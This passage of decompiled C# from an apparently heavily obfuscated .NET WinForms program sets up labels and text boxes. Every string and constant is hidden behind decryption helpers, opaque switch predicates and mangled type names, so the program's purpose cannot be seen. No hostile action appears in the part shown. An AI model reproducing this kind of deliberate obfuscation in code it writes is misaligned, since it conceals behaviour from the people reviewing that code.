			int num434 = ((_003CModule_003E.KeyValuePair__2[196] == 61094) ? (-186769) : 0);
			array286[num434] = AllocateUninitializedArray;
		}
		array286[1] = string.Concat(char.ToString((char)Convert.ToInt32("2061", 8)), char.ToString('ڝ') + "ਧz");
		array286[(nint)((Array)(object)"\u0306\u0318").LongLength] = 5990;
		array286[3] = string.Concat(char.ToString('ଦ'), char.ToString('\t') + "G\u0005\u0001\u0004");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_290, array286);
		string value24 = string_290;
		char c87 = (char)array2[7];
		int num435 = Convert.ToInt32(value24, c87);
		int num436 = ((_003CModule_003E.ActivityOptions[44] <= (MbcsString & 0x763E5)) ? Convert.ToInt32("111111111" + "111101" + "01111010011101010", 2) : 8242);
		int num437;
		if (num435 <= num436)
		{
			num437 = checked(-1054 * array2[269] + -615184);
		}
		else
		{
			int num438 = default(int);
			switch (Convert.ToInt32("0", 8) * -578488)
			{
			case 0:
				num438 = 652640;
				break;
			}
			num437 = num438 - 652637;
		}
		((Control)toVector128Unsafe2).set_Font(new Font(text204, 10f, (FontStyle)num433, (GraphicsUnit)num437, (byte)checked(-911368 - (unchecked(-1334 * _003CModule_003E.get_PositiveSign[146]) - (Convert.ToInt32("2f9f6", 16) & 0x2FFCB)))));
		((Control)ToVector128Unsafe).set_ForeColor(SystemColors.Control);
		((Control)ToVector128Unsafe).set_Location(new Point(((Convert.ToInt32("101" + "0111110100100", 2) <= (0xCED16 ^ Convert.ToInt32("fff85fa8", 16))) ? (-129543) : _003CModule_003E.KeyValuePair__2[49]) * ~(0 << Convert.ToInt32("0", 16)), Marshal.SizeOf(typeof(StoreLow))));
		Label toVector128Unsafe3 = ToVector128Unsafe;
		string text205 = char.ToString((char)(1397112113 >> int_3 + 912839));
		int num439 = default(int);
		switch (checked(unchecked(-377752 - Convert.ToInt32("11111111111100011000001111011011", 2)) + -571533))
		{
		case 0:
			num439 = Convert.ToInt32("77713", 8) & array2[270];
			break;
		case 1:
			num439 = _003CModule_003E.ActivityOptions[167] * -1;
			break;
		}
		string text206 = char.ToString((char)num439);
		string text207 = char.ToString('午');
		string text208 = char.ToString((char)(array2[271] & '卯'));
		string string_291 = "퐭푸";
		object[] array287 = new object[get_ResourceExposureLevel];
		array287[0] = (char)(148510 % (int)array[112]);
		array287[checked(Convert.ToInt32("1", 16) * 1)] = 37;
		char c88 = (char)Convert.ToInt32("10011111001", 2);
		array287[2] = (int)c88;
		array287[3 * Convert.ToInt32("1", 2)] = "®\u0d99";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_291, array287);
		string string_292 = string.Concat(text205, text206, text207 + text208 + string_291);
		int num440 = ((((Marshal.SizeOf(typeof(Hidden)) > 972250) ? 1 : 0) != Convert.ToInt32("0", 2)) ? (-171119) : (-1071));
		int num441 = ((num440 <= _003CModule_003E.KeyValuePair__2[50]) ? 45 : Convert.ToInt32("ff" + "f9cc49", 16));
		object[] array288 = new object[num441 >> checked(-296399 + ((DebuggerTypeProxyAttribute > 679928) ? 314437 : _003CModule_003E.KeyValuePair__2[197]))];
		IntPtr intPtr5 = (nint)((Array)(object)string.Empty).LongLength;
		string string_293 = "蹹聠";
		object[] array289 = new object[6];
		array289[0] = Convert.ToInt32(char.ToString('1') + "55", 8);
		array289[0x5CFBA ^ array2[272]] = getter;
		array289[_003CModule_003E.KeyValuePair__2[0] & array2[0]] = Convert.ToInt32("160714511", 8) >> 10;
		array289[3] = string.Concat(char.ToString('\u034d'), char.ToString((char)PackUnsignedSaturate), char.ToString('2') + "\0\0\0\u0003");
		array289[Convert.ToInt32("4", array2[97])] = (char)Convert.ToInt32(char.ToString('6') + "cc", GCHeapDumpKeyword);
		int num442 = Convert.ToInt32("101", 2);
		array289[num442] = false;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_293, array289);
		string text209 = string_293;
		string text210 = char.ToString((char)Convert.ToInt32(char.ToString('6') + "23", 8));
		int num443 = default(int);
		switch (checked(Convert.ToInt32("e3785", 16) - 931717))
		{
		case 0:
			num443 = 1633;
			break;
		}
		string text211 = char.ToString((char)num443);
		string string_294 = "\uf4d9\uf6df";
		object[] obj50 = new object[5]
		{
			Convert.ToInt32(char.ToString('1') + char.ToString('b') + "04", 16),
			null,
			null,
			null,
			null
		};
		int num444 = sizeof(bool);
		obj50[num444] = string.Concat(char.ToString('Ḧ'), char.ToString((char)array2[273]), char.ToString('ᑏ') + "ɧ:!%");
		obj50[_003CModule_003E.ActivityOptions[0]] = (byte)(4900 >> (int)array[59]) != 0;
		obj50[3] = 24848;
		obj50[array2[5]] = "ܤܪ";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_294, obj50);
		array288[(nint)intPtr5] = string.Concat(text209, text210 + text211 + string_294);
		int num445 = (_003CModule_003E.get_PositiveSign[192] ^ 0x6EBC4) / Convert.ToInt32("1", 2);
		int num446 = (((nint)((-73917 < checked(-686948 - _003CModule_003E.ActivityOptions[168])) ? 1 : 0) != (nint)((Array)(object)string.Empty).LongLength) ? Convert.ToInt32("37" + "774265052", 8) : 713661);
		array288[1] = num445 + num446;
		char actualValue2 = (char)ActualValue;
		char num447 = actualValue2;
		int num448 = ((checked(72422 * array2[2]) != Convert.ToInt32("4391b13e", 16) / 15653) ? Convert.ToInt32("fff" + "ad98c", 16) : SecurityElement);
		int num449 = array2[11];
		array288[(uint)num447] = (byte)checked(num448 + (199063154 >> num449)) != 0;
		int readInt32BigEndian = ReadInt32BigEndian;
		int num450 = default(int);
		switch (checked(readInt32BigEndian - unchecked(array2[274] % -2910)))
		{
		case 0:
			num450 = 602549 + Convert.ToInt32("11111111111101101100111001000111", 2);
			break;
		}
		int num451 = ~num450;
		string text212 = char.ToString((char)(~Convert.ToInt32("ff" + "ffeb60", 16)));
		string string_295 = "⡻⭮";
		object[] array290 = new object[3];
		array290[0] = 4178;
		array290[sizeof(byte)] = false;
		array290[2] = '\u1ab6';
		_003CModule_003E.TAIWANLUNISOLAR(ref string_295, array290);
		array288[num451] = text212 + string_295;
		int num452 = Marshal.SizeOf(typeof(CallConvs));
		int num453 = default(int);
		switch (Convert.ToInt32("101", 2) % 2)
		{
		case 0:
			num453 = Conv_Ovf_U_Un;
			break;
		case 1:
			num453 = -50125;
			break;
		}
		array288[num452] = -982534 ^ checked(num453 - 931101);
		_003CModule_003E.GetMaxByteCount(ref string_292, array288);
		((Control)toVector128Unsafe3).set_Name(string_292);
		Label toVector128Unsafe4 = ToVector128Unsafe;
		int num454 = Convert.ToInt32("101" + "11111001101010", 2) + _003CModule_003E.ActivityOptions[45];
		int num455 = ((checked(Convert.ToInt32("773533", 8) - 207624) <= -2889610 % Convert.ToInt32("11111111111011100101110011111100", 2)) ? 400564 : array2[Convert.ToInt32("13", 8)]);
		int width10 = num454 >> num455;
		int num456 = default(int);
		switch (checked(Convert.ToInt32("433042", 8) + array2[275]))
		{
		case 0:
			num456 = 1009238;
			break;
		}
		int num457 = num456 + -400171;
		int num458 = default(int);
		switch (Convert.ToInt32("0", 2) / _003CModule_003E.get_PositiveSign[193])
		{
		case 0:
			num458 = -609048;
			break;
		}
		int num459 = num458;
		Label toVector128Unsafe5;
		checked
		{
			((Control)toVector128Unsafe4).set_Size(new Size(width10, num457 + num459));
			((Control)ToVector128Unsafe).set_TabIndex(array2[75] >> Convert.ToInt32(char.ToString('1') + "001", 2) >> Convert.ToInt32("3", sizeof(ulong)) * get_CurrencyGroupSeparator);
			toVector128Unsafe5 = ToVector128Unsafe;
		}
		string text213 = char.ToString((char)Marshal.SizeOf(typeof(__9__106_0)));
		string string_296 = "\ue361\ue369";
		object[] array291 = new object[3];
		char c89 = (char)((Array)(object)string.Empty).Length;
		array291[0] = (byte)c89 != 0;
		array291[(uint)array[3]] = '斔';
		array291[2 & array2[4]] = 3005 % EventWrittenEventArgs;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_296, array291);
		string string_297 = text213 + string_296;
		char c90 = (char)(~checked(Convert.ToInt32("5", 16) * -1));
		object[] array292 = new object[(uint)c90];
		string string_298 = "\ued78";
		object[] array293 = new object[_003CModule_003E.ActivityOptions[Marshal.SizeOf(typeof(CharSetMask))]];
		array293[0] = (byte)array2[1] != 0;
		array293[Convert.ToInt32("110111011001101000", 2) >> Convert.ToInt32("11", 16)] = -895523 - array2[276];
		int num460 = default(int);
		switch (_003CModule_003E.ActivityOptions[1] * -450137)
		{
		case 0:
			num460 = ((Array)(object)"\u0364\u0336").Length;
			break;
		case 1:
			num460 = 602560;
			break;
		}
		array293[num460] = (char)Marshal.SizeOf(typeof(IsLower));
		array293[3] = ((Convert.ToInt32("6ddb", 16) > 190317) ? (-163135) : 55301);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_298, array293);
		int num461 = Convert.ToInt32(string_298, 8);
		string string_299 = string.Concat(char.ToString('㟈'), char.ToString('㟈'), char.ToString('㟈') + char.ToString('㟍') + "㞗㞝㟌㞘");
		object[] array294 = new object[5];
		array294[(uint)array[2]] = (char)Convert.ToInt32("76", ((Array)(object)"\u031e\u031d\u032f\u0303\u0337\u034d\u0328\u0364").Length);
		array294[1] = checked(_003CModule_003E.KeyValuePair__2[198] - 482848);
		int num462 = ((Convert.ToInt32("37777660467", 8) != -85878) ? 2 : RegisteredWaitHandleSafe);
		int num463 = ((50309 <= Convert.ToInt32("37776202320", 8)) ? 879326 : array[113]);
		array294[num462] = num463;
		array294[3] = '⒎';
		IntPtr intPtr6 = (nint)((Array)(object)(char.ToString('\u0355') + char.ToString('\u0309') + "h\u0358")).LongLength;
		int num464 = Convert.ToInt32("10010110", 2);
		array294[(nint)intPtr6] = num464;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_299, array294);
		int num465 = ((((23015 < Convert.ToInt32(string_299, checked(-995527 + _003CModule_003E.KeyValuePair__2[199]))) ? 1 : 0) != array6[0]) ? array6[30] : 2948);
		array292[num461] = num465;
		string string_300 = "ꏸ";
		object[] array295 = new object[2];
		array295[checked(Convert.ToInt32("37776230274", 8) - -446276)] = _003CModule_003E.ActivityOptions[169] / 51089;
		char num466 = array[Convert.ToInt32("11", 2)];
		int num467 = Convert.ToInt32("110100011101", 2);
		array295[(uint)num466] = num467;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_300, array295);
		array292[sizeof(bool)] = (byte)(Convert.ToInt32(string_300, 16) * CommonDocuments) != 0;
		string string_301 = "䃴";
		object[] array296 = new object[Convert.ToInt32(char.ToString('1') + "00", 2)];
		int num468 = Marshal.SizeOf(typeof(get_IsAuthenticated));
		array296[0] = num468;
		array296[array2[278] + 268203] = (byte)array2[1] != 0;
		array296[Marshal.SizeOf(typeof(FractionalDigitsCount)) % (int)array[6]] = string.Concat(char.ToString((char)Convert.ToInt32("7f8", 16)), char.ToString('م') + char.ToString('[') + "ܕa3\u000f");
		array296[Convert.ToInt32("3", 16)] = "Ýᡸ";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_301, array296);
		string value25 = string_301;
		int num469 = get_IsMemberRef % 4;
		int stream3 = Stream;
		array292[Convert.ToInt32(value25, num469 << stream3)] = S400_400_100;
		int num470 = ((array2[279] < 710413) ? 932106 : (-875585)) - array2[76];
		char c91 = (char)Marshal.SizeOf(typeof(ELEMENT_TYPE_R8));
		int num471;
		if (num470 == (int)c91)
		{
			string string_302 = string.Concat(char.ToString('팰') + char.ToString('팰') + "팰팰팰팰팰팰", "팰팰팰" + "팰팰팰팱팰팱", char.ToString('팰') + "팱팰팱팰" + "팰팰팱팱팱팰팱팰팰팱");
			object[] array297 = new object[_003CModule_003E.get_PositiveSign[8] % 10];
			array297[array2[1]] = MemberName;
			array297[1] = Convert.ToInt32(char.ToString('1') + "5414", ((Array)(object)"\u032e\u0301\u0311.\u0319\u0347\u030d\u035a").Length);
			array297[2] = 'ϱ';
			array297[3] = (char)Convert.ToInt32(char.ToString('1') + "3471", 8);
			array297[checked(VT_HRESULT + 562251)] = Convert.ToInt32(char.ToString('5') + char.ToString('3') + "00", Convert.ToInt32("10000", 2));
			_003CModule_003E.TAIWANLUNISOLAR(ref string_302, array297);
			num471 = Convert.ToInt32(string_302, Convert.ToInt32("1", 8) << array2[2]);
		}
		else
		{
			num471 = _003CModule_003E.get_PositiveSign[Convert.ToInt32("76", 8)] >> CreateGlobalFunctions;
		}
		int num472 = num471;
		string string_303 = string.Concat(char.ToString('\u17c0'), char.ToString('\u17cd') + "នន");
		object[] array298 = new object[903946952 / array2[280]];
		array298[0] = 715 % _003CModule_003E.get_PositiveSign[125];
		array298[1 * _003CModule_003E.ActivityOptions[2]] = "ᑔ\u0312";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_303, array298);
		string text214 = char.ToString((char)Convert.ToInt32(string_303, 16));
		string text215 = char.ToString((char)((Convert.ToInt32("111111111111" + "11110000110010101101", 2) <= Marshal.SizeOf(typeof(Identifier))) ? 'ŝ' : Convert.ToInt32(char.ToString('7') + "43cf", 16)));
		string string_304 = "蕷謆";
		object[] array299 = new object[4];
		array299[Convert.ToInt32("0", 2) << array2[94]] = (byte)((false ? 1u : 0u) | (uint)get_PositiveInfinity) != 0;
		array299[1] = string.Concat(char.ToString((char)Convert.ToInt32("2453", 8)), char.ToString('ࠓ'), char.ToString('ղ') + "ĸɜФo");
		int num473 = ((-90491 != Convert.ToInt32("37777476771", 8)) ? 2 : _003CModule_003E.KeyValuePair__2[200]);
		array299[num473] = string.Concat(char.ToString('\u0bc8'), char.ToString('ё'), char.ToString('Å') + "ưW\u0015");
		char c92 = array[5];
		array299[(int)c92] = 22845;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_304, array299);
		array292[num472] = text214 + text215 + string_304;
		_003CModule_003E.GetMaxByteCount(ref string_297, array292);
		((Control)toVector128Unsafe5).set_Text(string_297);
		TextBox hString = HString;
		int red7 = Marshal.SizeOf(typeof(MissingSatelliteAssemblyException)) ^ Convert.ToInt32("10000011001100000110", 2) ^ Convert.ToInt32(char.ToString('f') + char.ToString('f') + "f95541", 16) ^ (Convert.ToInt32(char.ToString('9') + char.ToString('6') + "2d5", 16) ^ -272521);
		string string_305 = string.Concat(char.ToString('얫'), char.ToString('얫') + char.ToString('얬') + "얭얭얯얮");
		object[] array300 = new object[-3 * array2[99]];
		array300[array2[2] & array2[1]] = (char)Convert.ToInt32(char.ToString('5') + "1313", _003CModule_003E.get_PositiveSign[3]);
		array300[Convert.ToInt32("1", 8)] = -864429 + _003CModule_003E.ActivityOptions[170];
		array300[2] = string.Concat("丬\u0df7", char.ToString('ϛ') + char.ToString('û') + "ˑ\u0010ø");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_305, array300);
		int num474 = Convert.ToInt32(string_305, -553992 - Convert.ToInt32("37775705760", 8));
		int num475 = -1740726104 ^ Convert.ToInt32("1001010000010111000", 2);
		int num476 = ((array2[281] >= 155142) ? (-802016) : 1742278660);
		int num477 = default(int);
		switch (checked(num474 + (num475 | num476)))
		{
		case 0:
			num477 = 39;
			break;
		}
		int green5 = num477;
		string string_306 = "䠐";
		object[] array301 = new object[2];
		array301[Convert.ToInt32("0", Stream)] = string.Concat(char.ToString('ᐊ'), char.ToString('ϥ') + char.ToString('┻') + "ϑɖ");
		array301[Marshal.SizeOf(typeof(PerCoreLockedStacks)) + Convert.ToInt32("11111111111110011001100101011000", 2)] = 175936 + Convert.ToInt32("37777252744", 8);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_306, array301);
		((Control)hString).set_BackColor(Color.FromArgb(red7, green5, Convert.ToInt32(string_306, 16) * ((0xE400100 | array2[282]) / array2[77])));
		((TextBoxBase)HString).set_BorderStyle((BorderStyle)0);
		TextBox hString2 = HString;
		string text216 = char.ToString('㡁');
		int num478;
		if (Convert.ToInt32(char.ToString('4') + "7364", 8) > checked(array2[283] * -1))
		{
			num478 = -155195;
		}
		else
		{
			int num479 = ((_003CModule_003E.ActivityOptions[171] != 77512) ? (-762680) : array[114]);
			num478 = num479;
		}
		string text217 = char.ToString((char)num478);
		string text218 = char.ToString('㡵');
		string text219 = char.ToString('㡽');
		string string_307 = string.Concat(char.ToString('튑'), char.ToString('틔') + "튡튽");
		object[] array302 = new object[(uint)array[sizeof(float)]];
		array302[0] = (byte)(Multiply10 >> 13) != 0;
		array302[sizeof(bool)] = 0x2A17 | Marshal.SizeOf(typeof(CharSetMask));
		array302[2] = (char)((uint)Convert.ToInt32("11101011001110011100", 2) ^ 0xEAF1Au);
		array302[_003CModule_003E.ActivityOptions[86] * Convert.ToInt32("ffffffff", 16)] = ((Convert.ToInt32("2e58", 16) > 115856) ? (-261865) : 7884);
		array302[4] = string.Concat(char.ToString('\u1a7e'), char.ToString('Ş') + "Ი\u175a");
		array302[5] = char.ToString('᠊') + char.ToString('ਙ') + "໗ҵ";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_307, array302);
		string string_308 = string.Concat(text216, text217, text218 + text219 + string_307);
		char c93 = (char)(1013961 - _003CModule_003E.KeyValuePair__2[201]);
		int num480 = c93;
		int num481 = Sunday - Convert.ToInt32("fff7ac5a", 16);
		int num482 = default(int);
		switch (GetBaseDefinition)
		{
		case 237989:
			num482 = -533658;
			break;
		}
		object[] array303 = new object[(num480 >= (num481 ^ num482)) ? (_003CModule_003E.ActivityOptions[Convert.ToInt32("56", 8)] + 448009) : DefineInitializedData];
		char num483 = array4[(27848 < _003CModule_003E.get_PositiveSign[Convert.ToInt32("3f", 16)]) ? array2[78] : 0];
		int num484 = ((Sqm < 512663) ? 757371140 : (-758353));
		int num485 = num484 | 0x11348296;
		int num486 = Convert.ToInt32("37775757341", 8) + 531766;
		int num487 = _003CModule_003E.KeyValuePair__2[202];
		array303[(uint)num483] = num485 / checked(num486 * num487);
		array303[((32534 - Marshal.SizeOf(typeof(ValueTuple__4))) * Convert.ToInt32("1", array2[7])) ^ checked(-12439 * _003CModule_003E.KeyValuePair__2[12])] = checked(-1576 * (TX_NN + _003CModule_003E.get_PositiveSign[64]));
		int num488 = _003CModule_003E.LoadVector128[get_PositiveInfinity | 2];
		int num489 = ((((Convert.ToInt32("ffff89ea", 16) == -30230) ? 1u : 0u) == array[2]) ? (-739832) : 0);
		int num490 = _003CModule_003E.ActivityOptions[47];
		array303[num488] = (byte)(num489 % num490) != 0;
		string string_309 = string.Concat("굃굃굃" + "굃굃굃굃굃굃", char.ToString('굃') + char.ToString('굃') + "굃굃굃굃굃굃굃굃굃굃굃굃굃굃굃굃굃굃굃굂굂");
		object[] obj51 = new object[3]
		{
			Marshal.SizeOf(typeof(MinMagnitude)),
			null,
			null
		};
		char c94 = (char)Convert.ToInt32("1", 8);
		obj51[(int)c94] = char.ToString('ţ') + char.ToString('\u0a47') + "ʓȗ";
		int num491 = Convert.ToInt32("10", Stream);
		int num492 = ((((-10645 == array2[284]) ? 1 : 0) != _003CModule_003E.ActivityOptions[1]) ? (-418131) : 0);
		obj51[num491] = (byte)num492 != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_309, obj51);
		string text220;
		string string_310;
		checked
		{
			array303[~Convert.ToInt32(string_309, array2[0])] = -921247 - unchecked(Convert.ToInt32(char.ToString('5') + char.ToString('e') + "e1", 16) * -38);
			_003CModule_003E.GetMaxByteCount(ref string_308, array303);
			text220 = string_308;
			string_310 = "꾃";
			object[] array304 = new object[Stream];
			array304[0] = Convert.ToInt32(char.ToString('1') + "010000010010010", Marshal.SizeOf(typeof(ENODATA)));
			array304[get_CurrencyGroupSeparator] = HandleProcessCorruptedStateExceptionsAttribute;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_310, array304);
		}
		int num493 = Convert.ToInt32(string_310, sizeof(long)) * checked(442329 + unchecked(-289134 + array2[285]));
		int num494 = ((-52720 <= _003CModule_003E.ActivityOptions[172]) ? (-769087) : 6);
		((Control)hString2).set_Font(new Font(text220, 7.2f, (FontStyle)num493, (GraphicsUnit)(15 % checked(num494 * (Convert.ToInt32("1", 8) & 1))), (byte)(0 & _003CModule_003E.LoadVector128[(nint)((Array)(object)string.Empty).LongLength << 31])));
		((Control)HString).set_ForeColor(SystemColors.MenuBar);
		TextBox hString3 = HString;
		string string_311 = string.Concat(char.ToString('㵬') + char.ToString('㵬') + "㵬㵬㵬㵬㵬㵬", char.ToString('㵬'), "㵬㵬㵬㵭㵭㵬㵭㵬㵬㵬" + "㵭㵬㵬㵭㵭㵭㵬㵭㵭㵭㵬㵭㵬");
		object[] array305 = new object[_003CModule_003E.KeyValuePair__2[203] - 267469];
		array305[0] = (char)Marshal.SizeOf(typeof(MiddayAtPersianObservationSite));
		int num495 = get_CurrencyGroupSeparator;
		int num496 = Convert.ToInt32("91", 16);
		array305[num495] = (char)num496;
		array305[2] = Convert.ToInt32("43", 16);
		array305[(nint)((Array)(object)(char.ToString('\u0333') + "\u033e\u036b")).LongLength] = 2861;
		array305[Marshal.SizeOf(typeof(IsValidText))] = 6723;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_311, array305);
		((Control)hString3).set_Location(new Point(Convert.ToInt32(string_311, ((Array)(object)"\u0360.").Length) + ~Convert.ToInt32("1111" + "11111" + "11100101110110000100001", 2), Marshal.SizeOf(typeof(__9__25_13))));
		((TextBoxBase)HString).set_Multiline((byte)sizeof(bool) != 0);
		TextBox hString4 = HString;
		string string_312 = "ㄑ\u3100";
		object[] array306 = new object[array2[6]];
		array306[checked(-360432 + _003CModule_003E.KeyValuePair__2[204])] = IAsyncStateMachineBox;
		int num497 = get_CurrencyGroupSeparator;
		int num498 = ((Convert.ToInt32("ffff7a84", 16) == Convert.ToInt32("11111111111111110010111001111110", 2)) ? 333614 : 2796);
		array306[num497] = num498;
		array306[2] = char.ToString('ܓ') + "\0\u0002";
		array306[3] = '睿';
		array306[4] = 280;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_312, array306);
		string text221 = string_312;
		string text222 = char.ToString((char)checked(Convert.ToInt32("10111111010010101111", 2) - Lower));
		string text223 = char.ToString('\uf3ef');
		string string_313 = string.Concat(char.ToString('실'), char.ToString('싉') + "싞슓");
		object[] array307 = new object[5];
		array307[Convert.ToInt32("0", 8)] = (byte)_003CModule_003E.ActivityOptions[Convert.ToInt32("2", 8)] != 0;
		array307[1] = ((Array)(object)("\u033a\u0339\u0350\u0324\u0324" + "\u031c\u0358" + "\u0354\u036e\u032f\u030c\u0341\u0337\u0308\u0321\u0318\u032d\u0339")).Length;
		array307[Convert.ToInt32("2660210", 8) + -745606] = checked(Convert.ToInt32("1001312", 8) - 260685);
		array307[3] = Convert.ToInt32("100" + "1100110110", 2);
		array307[(uint)array[6]] = ((-76086 <= Convert.ToInt32("11111111111110100001110101110110", 2)) ? 744203 : 5495);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_313, array307);
		string string_314 = string.Concat(text221, text222 + text223 + string_313);
		int num499 = default(int);
		switch (-411528 - Convert.ToInt32("fff9b877", 16))
		{
		case 0:
			num499 = Convert.ToInt32("111100011000000", 2);
			break;
		case 1:
			num499 = 735055332;
			break;
		}
		int num500 = num499;
		char c95 = (char)_003CModule_003E.ActivityOptions[173];
		int num501 = num500 / (int)c95;
		int num502 = default(int);
		checked
		{
			switch (0 * unchecked(array2[286] - 993942))
			{
			case 0:
				num502 = 941167;
				break;
			}
		}
		object[] array308 = new object[num501 - num502];
		array308[checked(592238 - array6[31])] = (-572 ^ ~Convert.ToInt32("110010101100", 2)) % 1494;
		string string_315 = "㉑";
		object[] array309 = new object[5];
		array309[array[2] & Convert.ToInt32("0", 16)] = string.Concat(char.ToString('ᜭ'), char.ToString((char)Convert.ToInt32("11100011111", 2)), char.ToString('ø') + char.ToString('\u001a') + "C\f%");
		char c96 = (char)_003CModule_003E.ActivityOptions[2];
		int num503 = c96;
		int num504 = default(int);
		switch (checked(520211 - array2[287]))
		{
		case 0:
			num504 = 9750;
			break;
		case 1:
			num504 = 50931;
			break;
		case 2:
			num504 = 122;
			break;
		}
		array309[num503] = num504;
		array309[2] = string.Concat(char.ToString('\u0656'), char.ToString('\u0083') + "Dó\u001c");
		array309[Marshal.SizeOf(typeof(CharSetMask))] = 1268 << Marshal.SizeOf(typeof(UseHebrewParsing));
		array309[4] = (byte)array[2] != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_315, array309);
		string value26 = string_315;
		int fromBase13 = default(int);
		switch (checked(Marshal.SizeOf(typeof(UseHebrewParsing)) * 1))
		{
		case 0:
			fromBase13 = -408149;
			break;
		case 1:
			fromBase13 = ((Array)(object)"\u0329.").Length;
			break;
		case 2:
			fromBase13 = 104733;
			break;
		}
		char c97 = (char)Convert.ToInt32(value26, fromBase13);
		int num505 = c97;
		int num506 = 777135 + _003CModule_003E.get_PositiveSign[65];
		int num507 = (((-1298 & array2[288]) == Convert.ToInt32(char.ToString('3') + "7777517312", 8)) ? 496438 : (-2));
		array308[num505] = num506 * num507;
		int num508 = Marshal.SizeOf(typeof(__c__DisplayClass0_14)) + Convert.ToInt32("ff" + "f20a3e", 16);
		string string_316 = string.Concat(char.ToString('㭋') + char.ToString('㭊') + "㭋㭋", char.ToString('㭋') + "㭊㭊", "㭊㭊㭊㭋㭋" + "㭋㭋㭋㭊㭊㭊㭋㭋");
		object[] array310 = new object[5];
		array310[-238568 - Convert.ToInt32("11111111111111000101110000011000", 2)] = array2[79];
		array310[1] = 1369;
		array310[checked(-405520 - Convert.ToInt32("37776347756", 8))] = (byte)((false ? 1u : 0u) | (uint)Convert.ToInt32("0", 2)) != 0;
		array310[(Marshal.SizeOf(typeof(Bne_Un_S)) < 194127) ? 3 : 432299] = Convert.ToInt32("100" + "010000001", Stream);
		array310[4] = _003CModule_003E.KeyValuePair__2[52];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_316, array310);
		int num510 = default(int);
		switch (checked(num508 + Convert.ToInt32(string_316, array2[289] - -202959)))
		{
		case 0:
			num510 = 2;
			break;
		case 1:
			num510 = array6[~StoreSelectedScalar];
			break;
		case 2:
			num510 = _003CModule_003E.KeyValuePair__2[53] & 0x8FC7F;
			break;
		case 3:
		{
			int num509 = ((475244 - Register >= (Convert.ToInt32("11111111111100100100001011101000", 2) ^ -828298)) ? (-993684) : (-360146));
			num510 = num509;
			break;
		}
		}
		int num511 = num510;
		int num512 = ((Convert.ToInt32("ffffb917", 16) <= ModuleInitializerAttribute) ? checked(Convert.ToInt32("37777775561", 8) * -1) : 542601);
		string text224 = char.ToString((char)num512);
		string text225 = char.ToString('ɬ');
		string text226 = char.ToString((char)(~_003CModule_003E.KeyValuePair__2[135]));
		string text227 = char.ToString('D');
		string string_317 = char.ToString('鍭') + "鍼鍲";
		object[] array311 = new object[2];
		char num513 = array[2];
		int num514 = default(int);
		switch (checked(_003CModule_003E.ActivityOptions[174] - -879106))
		{
		case 0:
			num514 = 31166;
			break;
		}
		array311[(uint)num513] = (char)num514;
		array311[Convert.ToInt32("1", 16)] = (char)Convert.ToInt32(char.ToString('1') + char.ToString('4') + "662", 8);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_317, array311);
		array308[num511] = string.Concat(text224, text225, text226 + text227 + string_317);
		int num515 = default(int);
		switch (checked(Convert.ToInt32("11111111111100101101110001001011", 2) - -861110))
		{
		case 0:
			num515 = Convert.ToInt32("11000010011110001101", 2);
			break;
		case 1:
			num515 = 1;
			break;
		case 2:
			num515 = 130740;
			break;
		case 3:
			num515 = 166329;
			break;
		}
		int num516 = default(int);
		switch ((1 & num515) * (Convert.ToInt32("5", array2[7]) % 2))
		{
		case 0:
			num516 = -125130;
			break;
		case 1:
			num516 = 1819825630 >> Marshal.SizeOf(typeof(get_Item5));
			break;
		}
		array308[num516] = Marshal.SizeOf(typeof(RuntimeFieldInfoStub));
		string string_318 = "䢈";
		object[] array312 = new object[3];
		array312[0] = 98;
		array312[checked(Convert.ToInt32("11111111111111010111111101101101", 2) - array2[291])] = false;
		array312[2] = array2[80];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_318, array312);
		int num517 = Convert.ToInt32(string_318, 8);
		string text228 = char.ToString((char)Marshal.SizeOf(typeof(RemoveAll)));
		string text229 = char.ToString('d');
		string string_319 = "\ue036\ue033";
		object[] array313 = new object[5];
		array313[Convert.ToInt32("0", 16)] = string.Concat(char.ToString('ང'), char.ToString('փ') + char.ToString('ใ') + "ł\a");
		array313[1] = (int)array[47];
		array313[2] = (int)array[48];
		array313[(17551 == array2[292]) ? Convert.ToInt32("5535e", 16) : 3] = (int)array[49];
		array313[Convert.ToInt32("4", 16)] = string.Concat(char.ToString((char)Convert.ToInt32("111001100011", 2)), char.ToString((char)Convert.ToInt32("2e", 16)), char.ToString('\u0004') + "4.7");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_319, array313);
		array308[num517] = Convert.ToInt32(text228 + text229 + string_319, 80 % checked(array2[293] - 760350));
		_003CModule_003E.GetMaxByteCount(ref string_314, array308);
		((Control)hString4).set_Name(string_314);
		((TextBoxBase)HString).set_ReadOnly((byte)(1 * (Convert.ToInt32("10" + "01010", sizeof(char)) >> (int)((Array)(object)(char.ToString('\u0305') + char.ToString('\u0321') + "\u0339\u0326\u035a\u030a")).LongLength)) != 0);
		TextBox hString5 = HString;
		string string_320 = char.ToString('Đ') + "ęŜ";
		object[] array314 = new object[(uint)array[5]];
		array314[0] = (byte)_003CModule_003E.ActivityOptions[1] != 0;
		array314[1] = array2[Marshal.SizeOf(typeof(Rem))];
		array314[Stream | array2[0]] = 258;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_320, array314);
		hString5.set_ScrollBars((ScrollBars)array4[(nint)((Array)(object)string_320).LongLength]);
		TextBox hString6 = HString;
		int num518 = default(int);
		switch (~_003CModule_003E.ActivityOptions[5] / -130)
		{
		case 0:
			num518 = TwoDigitYearMax;
			break;
		case 1:
